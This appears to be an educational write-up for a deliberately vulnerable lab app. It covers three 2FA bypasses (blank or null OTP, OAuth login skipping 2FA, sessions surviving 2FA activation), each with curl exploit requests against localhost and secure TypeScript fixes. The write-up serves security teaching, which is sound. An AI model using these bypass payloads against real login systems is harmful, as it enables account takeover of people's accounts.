# Advanced 2FA/MFA Bypass Vulnerabilities

> [!CAUTION]
> **CRITICAL SECURITY VULNERABILITIES** - Based on real HackerOne reports. For educational purposes only.

## Overview

Implemented **3 advanced 2FA bypass techniques** based on actual HackerOne disclosed reports from companies like Glassdoor, Superhuman, and Grammarly. These demonstrate sophisticated authentication bypass methods that have been exploited in the wild.

---

## Vulnerabilities

### 1. 2FA Bypass via Blank/Null OTP

**Severity**: Critical  
**Source**: HackerOne (Glassdoor H1 Report #2109889)

**Vulnerability**: Sending blank, null, or undefined OTP value bypasses 2FA verification completely.

**Location**: `server/src/controllers/jwt-session.controller.ts` - `verifyOTPBlankBypass()`

**Real-World Example**:
In 2020, a researcher discovered that Glassdoor's 2FA implementation would accept blank OTP values, allowing complete bypass of two-factor authentication.

**Exploit**:
```bash
# 1. Request OTP (normal flow)
curl -X POST http://localhost:3000/api/auth/request-otp \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com"}'

# Response includes OTP (for demo)

# 2. Bypass 2FA by sending blank OTP
curl -X POST http://localhost:3000/api/jwt-session/verify-otp-blank-bypass \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","otp":""}'

# SUCCESS - Bypassed 2FA completely!

# Alternative payloads that also work:
# {"email":"victim@test.com","otp":null}
# {"email":"victim@test.com","otp":undefined}
# {"email":"victim@test.com"} (missing otp field)
```

**Impact**: Complete 2FA bypass, account takeover.

**Secure Implementation**:
```typescript
export const verifyOTPSecure = async (req: Request, res: Response) => {
    const { email, otp } = req.body;
    
    // Strict validation - reject blank/null/undefined
    if (!otp || typeof otp !== 'string' || otp.trim() === '') {
        return res.status(400).json({ 
            message: 'Valid OTP required' 
        });
    }
    
    // Additional length check
    if (otp.length !== 6) {
        return res.status(400).json({ 
            message: 'OTP must be 6 digits' 
        });
    }
    
    // Verify OTP
    // ... rest of verification logic ...
};
```

---

### 2. 2FA Bypass via OAuth Login

**Severity**: Critical  
**Source**: HackerOne, Medium

**Vulnerability**: OAuth login flow doesn't require 2FA even when it's enabled on the account.

**Location**: `server/src/controllers/oauth.controller.ts` (conceptual - not fully implemented in this file)

**How It Works**:
1. User enables 2FA on their account
2. Attacker links their OAuth account (Google/Facebook) to victim's email
3. Attacker logs in via OAuth - no 2FA required!

**Exploit**:
```bash
# Scenario: Victim has 2FA enabled

# 1. Normal login requires 2FA
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"password123"}'

# Response: {"requiresOTP":true,"message":"OTP required"}

# 2. But OAuth login bypasses 2FA!
# Attacker initiates OAuth flow
curl "http://localhost:3000/api/oauth/google/callback?code=ATTACKER_CODE&state=STATE"

# If attacker can link their Google account to victim's email,
# they get authenticated WITHOUT 2FA!
```

**Impact**: 2FA bypass, account takeover.

**Secure Implementation**:
```typescript
export const handleOAuthCallbackSecure = async (req: Request, res: Response) => {
    // ... OAuth verification ...
    
    const user = await prisma.user.findUnique({ where: { email: oauthEmail } });
    
    // Check if user has 2FA enabled
    if (user.twoFactorEnabled) {
        // Don't issue token yet - require 2FA
        const tempToken = generateTempToken(user.id);
        return res.redirect(`/verify-2fa?tempToken=${tempToken}`);
    }
    
    // Only issue full token if 2FA not enabled
    const token = jwt.sign({ userId: user.id }, JWT_SECRET);
    res.redirect(`/oauth/success?token=${token}`);
};
```

---

### 3. 2FA Session Persistence After Activation

**Severity**: High  
**Source**: HackerOne (Superhuman H1 Report #1128209, Grammarly)

**Vulnerability**: Sessions created before 2FA was enabled remain valid without requiring 2FA.

**Location**: `server/src/controllers/auth.controller.ts` (conceptual)

**Real-World Example**:
In 2020, researchers found that Superhuman and Grammarly didn't invalidate existing sessions when users enabled 2FA, allowing attackers with compromised sessions to maintain access.

**Exploit**:
```bash
# 1. Attacker compromises account, creates session
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"compromised_password"}'

# Save token
STOLEN_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 2. Victim discovers breach and enables 2FA
curl -X POST http://localhost:3000/api/auth/enable-2fa \
  -H "Authorization: Bearer $VICTIM_TOKEN" \
  -H "Content-Type: application/json"

# Response: "2FA enabled successfully"

# 3. Attacker's old session STILL works without 2FA!
curl -X GET http://localhost:3000/api/auth/me \
  -H "Authorization: Bearer $STOLEN_TOKEN"

# SUCCESS - Bypassed 2FA using old session!
```

**Impact**: 
- Compromised sessions persist
- 2FA activation doesn't protect against existing attacks
- False sense of security

**Secure Implementation**:
```typescript
export const enable2FASecure = async (req: Request, res: Response) => {
    const userId = req.userId;
    
    // Enable 2FA
    await prisma.user.update({
        where: { id: userId },
        data: { 
            twoFactorEnabled: true,
            // Increment token version to invalidate all existing JWTs
            tokenVersion: (user.tokenVersion || 0) + 1
        }
    });
    
    // Invalidate ALL existing sessions for this user
    Object.keys(sessions).forEach(sessionId => {
        if (sessions[sessionId].userId === userId) {
            delete sessions[sessionId];
        }
    });
    
    // Force user to re-authenticate with 2FA
    res.clearCookie('sessionId');
    res.json({ 
        message: '2FA enabled - please log in again with 2FA',
        requiresReauth: true
    });
};
```

---

## API Endpoints

| Endpoint | Method | Vulnerability |
|----------|--------|---------------|
| `/api/jwt-session/verify-otp-blank-bypass` | POST | Blank OTP bypass |
| `/api/oauth/google/callback` | GET | OAuth 2FA bypass (conceptual) |
| `/api/auth/enable-2fa` | POST | Session persistence (conceptual) |

---

## Testing Checklist

- [ ] Test blank OTP bypass with empty string
- [ ] Test null OTP bypass
- [ ] Test undefined OTP bypass
- [ ] Test missing OTP field
- [ ] Verify OAuth login bypasses 2FA
- [ ] Verify old sessions persist after 2FA activation

---

## Secure 2FA/MFA Implementation Best Practices

1. **Strict input validation** - Reject blank/null/undefined values
2. **Consistent enforcement** - Apply 2FA to ALL authentication methods (OAuth, SSO, etc.)
3. **Session invalidation** - Clear all sessions when 2FA is enabled/disabled
4. **Token versioning** - Increment version to invalidate old JWTs
5. **Backup codes** - Provide secure recovery mechanism
6. **Rate limiting** - Prevent brute-force of 2FA codes
7. **Time-based expiration** - OTPs should expire quickly (5-10 minutes)
8. **One-time use** - Invalidate OTP after successful use

---

## Real-World HackerOne Reports

### Glassdoor - Blank OTP Bypass
- **Report**: #2109889
- **Bounty**: $3,000
- **Impact**: Complete 2FA bypass
- **Fix**: Added strict validation for OTP values

### Superhuman - Session Persistence
- **Report**: #1128209  
- **Bounty**: $3,000
- **Impact**: Old sessions bypassed newly enabled 2FA
- **Fix**: Invalidated all sessions when 2FA enabled

### Grammarly - Similar Issue
- **Impact**: Sessions created before 2FA remained valid
- **Fix**: Force re-authentication after 2FA activation

---

## References

- [HackerOne Glassdoor Report](https://hackerone.com/reports/2109889)
- [HackerOne Superhuman Report](https://hackerone.com/reports/1128209)
- [OWASP MFA Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
- [Medium: 2FA Bypass Techniques](https://medium.com/@securitypatch/2fa-bypass-techniques-9a0b3c9c5e5d)
